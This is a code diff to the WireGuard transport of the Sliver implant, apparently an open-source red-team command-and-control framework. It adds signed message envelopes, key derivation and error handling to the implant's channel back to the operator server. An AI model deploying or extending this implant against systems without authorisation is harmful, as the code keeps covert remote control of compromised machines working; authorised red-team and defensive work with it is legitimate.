@@ -25,6 +25,8 @@ package wireguard
 import (
 	"bufio"
 	"bytes"
+	"crypto/ed25519"
+	"crypto/sha256"
 	"encoding/binary"
 	"errors"
 	"fmt"
@@ -33,15 +35,18 @@ import (
 	"net/netip"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
+	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
 	"github.com/bishopfox/sliver/implant/sliver/netstack"
+	"golang.org/x/crypto/blake2b"
 	"golang.zx2c4.com/wireguard/conn"
 	"golang.zx2c4.com/wireguard/device"
 	"golang.zx2c4.com/wireguard/tun"
@@ -49,6 +54,9 @@ import (
 )
 
 var (
+	// YamuxPreface - Magic bytes sent before yamux frames
+	YamuxPreface = "MUX/1"
+
 	serverTunIP = "100.64.0.1" // Don't let user configure this for now
 	tunnelNet   *netstack.Net
 	tunAddress  string
@@ -65,6 +73,36 @@ var (
 	PingInterval = 2 * time.Minute
 	failedConn   = 0
 )
+
+const wgEnvelopeSigningSeedPrefix = "env-signing-v1:"
+
+var (
+	envelopeSigningOnce  sync.Once
+	envelopeSigningErr   error
+	envelopeSigningKeyID uint64
+	envelopeSigningPriv  ed25519.PrivateKey
+)
+
+func wgEnvelopeSigningKey() (ed25519.PrivateKey, uint64, error) {
+	envelopeSigningOnce.Do(func() {
+		peerKeyPair := cryptography.GetPeerAgeKeyPair()
+		// NOTE: This file is rendered with Go's text/template; avoid literal template
+		// delimiters in string checks or the template parser will treat it as an action.
+		if peerKeyPair == nil || peerKeyPair.Private == "" || strings.Contains(peerKeyPair.Private, ".Build.PeerPrivateKey") {
+			envelopeSigningErr = errors.New("[wireguard] missing peer private key")
+			return
+		}
+
+		seed := sha256.Sum256([]byte(wgEnvelopeSigningSeedPrefix + peerKeyPair.Private))
+		envelopeSigningPriv = ed25519.NewKeyFromSeed(seed[:])
+
+		pub := envelopeSigningPriv.Public().(ed25519.PublicKey)
+		digest := blake2b.Sum256(pub)
+		envelopeSigningKeyID = binary.LittleEndian.Uint64(digest[:8])
+	})
+
+	return envelopeSigningPriv, envelopeSigningKeyID, envelopeSigningErr
+}
 
 // GetTNet - Get the netstack Net object
 func GetTNet() *netstack.Net {
@@ -87,6 +125,22 @@ func WriteEnvelope(connection net.Conn, envelope *pb.Envelope) error {
 		// {{end}}
 		return err
 	}
+
+	signingKey, keyID, err := wgEnvelopeSigningKey()
+	if err != nil {
+		return err
+	}
+	rawSigBuf := make([]byte, cryptography.RawSigSize)
+	binary.LittleEndian.PutUint16(rawSigBuf[:2], cryptography.EdDSA)
+	binary.LittleEndian.PutUint64(rawSigBuf[2:10], keyID)
+	copy(rawSigBuf[10:], ed25519.Sign(signingKey, data))
+	if _, werr := connection.Write(rawSigBuf); werr != nil {
+		// {{if .Config.Debug}}
+		log.Print("Socket error (write raw signature): ", werr)
+		// {{end}}
+		return werr
+	}
+
 	dataLengthBuf := new(bytes.Buffer)
 	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
 	if _, werr := connection.Write(dataLengthBuf.Bytes()); werr != nil {
@@ -121,11 +175,21 @@ func WritePing(connection net.Conn) error {
 
 // ReadEnvelope - Reads a message from the wireguard connection using length prefix framing
 func ReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
+	rawSigBuf := make([]byte, cryptography.RawSigSize)
 	dataLengthBuf := make([]byte, 4) // Size of uint32
-	if len(dataLengthBuf) == 0 || connection == nil {
+	if len(rawSigBuf) == 0 || len(dataLengthBuf) == 0 || connection == nil {
 		panic("[[GenerateCanary]]")
 	}
-	n, err := io.ReadFull(connection, dataLengthBuf)
+
+	n, err := io.ReadFull(connection, rawSigBuf)
+	if err != nil || n != len(rawSigBuf) {
+		// {{if .Config.Debug}}
+		log.Printf("Socket error (read raw signature): %v\n", err)
+		// {{end}}
+		return nil, err
+	}
+
+	n, err = io.ReadFull(connection, dataLengthBuf)
 	if err != nil || n != 4 {
 		// {{if .Config.Debug}}
 		log.Printf("Socket error (read msg-length): %v\n", err)
@@ -152,6 +216,13 @@ func ReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 		return nil, err
 	}
 
+	if !cryptography.MinisignVerifyRaw(dataBuf, rawSigBuf) {
+		// {{if .Config.Debug}}
+		log.Printf("Invalid signature on wireguard envelope")
+		// {{end}}
+		return nil, errors.New("[wireguard] invalid signature")
+	}
+
 	// Unmarshal the protobuf envelope
 	envelope := &pb.Envelope{}
 	err = proto.Unmarshal(dataBuf, envelope)
@@ -165,6 +236,10 @@ func ReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 	return envelope, nil
 }
 
+func formatWGEndpoint(address string, port uint16) string {
+	return net.JoinHostPort(address, strconv.Itoa(int(port)))
+}
+
 // getSessKeys - Connect to the wireguard server and retrieve session specific keys and IP
 func getSessKeys(address string, port uint16) error {
 	_, dev, tNet, err := bringUpWGInterface(address, port, wgImplantPrivKey, wgServerPubKey, wgPeerTunIP)
@@ -172,7 +247,9 @@ func getSessKeys(address string, port uint16) error {
 		return err
 	}
 
-	dev.Up()
+	if err := dev.Up(); err != nil {
+		return err
+	}
 
 	// {{if .Config.Debug}}
 	log.Printf("Initial wg connection. Attempting to connect to wg key exchange listener")
@@ -183,6 +260,7 @@ func getSessKeys(address string, port uint16) error {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect to wg key exchange listener: %v", err)
 		// {{end}}
+		_ = dev.Down()
 		return err
 	}
 
@@ -207,7 +285,10 @@ func getSessKeys(address string, port uint16) error {
 // WGConnect - Get a wg connection or die trying
 func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 	if wgSessPrivKey == "" || failedConn > 2 {
-		getSessKeys(address, port)
+		if err := getSessKeys(address, port); err != nil {
+			failedConn++
+			return nil, nil, err
+		}
 	}
 
 	// Bring up actual wireguard connection using retrieved keys and IP
@@ -261,7 +342,7 @@ func bringUpWGInterface(address string, port uint16, implantPrivKey string, serv
 	wgConf := bytes.NewBuffer(nil)
 	fmt.Fprintf(wgConf, "private_key=%s\n", implantPrivKey)
 	fmt.Fprintf(wgConf, "public_key=%s\n", serverPubKey)
-	fmt.Fprintf(wgConf, "endpoint=%s:%d\n", address, port)
+	fmt.Fprintf(wgConf, "endpoint=%s\n", formatWGEndpoint(address, port))
 	fmt.Fprintf(wgConf, "allowed_ip=%s/0\n", "0.0.0.0")
 
 	// {{if .Config.Debug}}
